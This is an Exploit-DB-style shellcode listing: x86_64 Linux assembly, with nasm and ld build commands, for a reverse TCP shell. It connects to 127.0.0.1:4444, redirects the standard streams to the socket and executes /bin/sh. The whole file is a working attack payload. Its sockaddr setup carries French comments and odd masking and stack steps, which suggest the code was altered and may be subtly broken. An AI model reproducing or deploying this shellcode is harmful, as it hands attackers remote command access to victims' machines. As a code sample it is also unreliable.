;Category: Shellcode
;Title: GNU/Linux x86_64 - Reverse Shell Shellcode
;EDB-ID: 42339
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 18/07/2017
;Architecture: Linux x86_64
;Tested on: #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

;nasm -f elf64 42339_reverse_tcp_shell.s -o reverse_tcp_shell.o
;ld reverse_tcp_shell.o -o reverse_tcp_shell

section .text
  global _start
    _start:
        xor rax, rax
        xor rbx, rbx
        xor rcx, rcx
        xor rdx, rdx
        xor rsi, rsi
        xor rdi, rdi

        push rbp
        mov rbp,rsp
		sub rdx, rdx
        push 1
        pop rsi
        push 2
        pop rdi
		push 41
        pop rax		    ; sys_socket
        syscall
		sub rsp, 8
        mov dword [rsp], 0x5c110902 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
        and dword [rsp], 0xFFFFF0FF ; Masque pour effacer le bit FF
        push rax
        mov dword [rsp+4], 0x02010180   ; IP 128.1.1.2
        mov rax, qword [rsp+4]          ; Charger la valeur dans un registre
        dec al                          ; Décrémenter le premier octet
        dec ah                          ; Décrémenter le deuxième octet
        dec byte [rsp+6]                ; Décrémenter le troisième octet
        dec byte [rsp+7]                ; Décrémenter le quatrième octet => 127.0.0.1
        pop rax
        lea rsi, [rsp]
        add rsp, 8
        pop rbx
        xor rbx, rbx
        mov dl, 16
        push 3
        pop rdi
        mov al, 42      ; sys_connect
        syscall
        xor rsi, rsi
    shell_loop:
        mov al, 33
        syscall
        add rsi, 1
        cmp rsi, 2
        jle shell_loop
        xor rax, rax
        xor rsi, rsi
        mov rdi, 0x68732f6e69622f2f
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 60
        dec al
        syscall
		